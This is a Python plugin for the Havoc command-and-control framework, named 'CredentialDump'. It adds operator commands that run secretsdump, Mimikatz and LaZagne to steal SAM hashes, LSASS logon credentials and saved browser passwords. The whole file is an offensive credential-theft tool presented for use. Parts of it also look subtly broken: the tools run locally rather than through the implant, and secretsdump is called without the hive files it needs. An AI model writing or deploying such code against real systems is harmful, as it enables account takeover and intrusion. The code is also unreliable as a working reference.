from havoc import Demon, RegisterCommand, Plugin
import os
import platform
import subprocess
import json

def dump_sam_hashes():
    """
    Dumps password hashes from the SAM database.
    """
    try:
        if platform.system() != 'Windows':
            return "[-] SAM database dumping is only supported on Windows."

        # Use impacket's secretsdump.py to extract hashes
        impacket_path = os.path.join(os.path.dirname(__file__), "impacket", "secretsdump.py")
        if not os.path.exists(impacket_path):
            return "[-] Impacket not found. Please install Impacket and ensure secretsdump.py is available."

        # Execute secretsdump.py to dump SAM hashes
        command = ["python", impacket_path, "local"]
        result = subprocess.run(command, capture_output=True, text=True)

        if result.returncode == 0:
            return f"[+] SAM hashes dumped successfully:\n{result.stdout}"
        else:
            return f"[-] Error dumping SAM hashes:\n{result.stderr}"
    except Exception as e:
        return f"[-] Error during SAM dump: {e}"

def dump_lsass_memory():
    """
    Dumps credentials from LSASS memory.
    """
    try:
        if platform.system() != 'Windows':
            return "[-] LSASS memory dumping is only supported on Windows."

        # Use Mimikatz or similar tools to dump LSASS memory
        mimikatz_path = os.path.join(os.path.dirname(__file__), "mimikatz.exe")
        if not os.path.exists(mimikatz_path):
            return "[-] Mimikatz not found. Please ensure mimikatz.exe is available."

        # Execute Mimikatz to dump LSASS memory
        command = [mimikatz_path, "privilege::debug", "sekurlsa::logonpasswords", "exit"]
        result = subprocess.run(command, capture_output=True, text=True)

        if result.returncode == 0:
            return f"[+] LSASS memory dumped successfully:\n{result.stdout}"
        else:
            return f"[-] Error dumping LSASS memory:\n{result.stderr}"
    except Exception as e:
        return f"[-] Error during LSASS dump: {e}"

def dump_browser_credentials():
    """
    Dumps saved credentials from web browsers.
    """
    try:
        if platform.system() != 'Windows':
            return "[-] Browser credential dumping is only supported on Windows."

        # Use a tool like LaZagne to extract browser credentials
        lazagne_path = os.path.join(os.path.dirname(__file__), "laZagne.exe")
        if not os.path.exists(lazagne_path):
            return "[-] LaZagne not found. Please ensure laZagne.exe is available."

        # Execute LaZagne to dump browser credentials
        command = [lazagne_path, "browsers"]
        result = subprocess.run(command, capture_output=True, text=True)

        if result.returncode == 0:
            return f"[+] Browser credentials dumped successfully:\n{result.stdout}"
        else:
            return f"[-] Error dumping browser credentials:\n{result.stderr}"
    except Exception as e:
        return f"[-] Error during browser credential dump: {e}"

# Havoc C2 Integration
def dump_sam_hashes_command(demon, *args):
    """
    Command to dump SAM hashes.
    """
    result = dump_sam_hashes()
    demon.ConsoleWrite(result)

def dump_lsass_memory_command(demon, *args):
    """
    Command to dump LSASS memory.
    """
    result = dump_lsass_memory()
    demon.ConsoleWrite(result)

def dump_browser_credentials_command(demon, *args):
    """
    Command to dump browser credentials.
    """
    result = dump_browser_credentials()
    demon.ConsoleWrite(result)

# Register commands with Havoc C2
def initialize():
    RegisterCommand("dump_sam_hashes", "Dump password hashes from the SAM database", dump_sam_hashes_command)
    RegisterCommand("dump_lsass_memory", "Dump credentials from LSASS memory", dump_lsass_memory_command)
    RegisterCommand("dump_browser_credentials", "Dump saved credentials from web browsers", dump_browser_credentials_command)

# Initialize the plugin
plugin = Plugin("CredentialDump", "Advanced credential dumping techniques", initialize)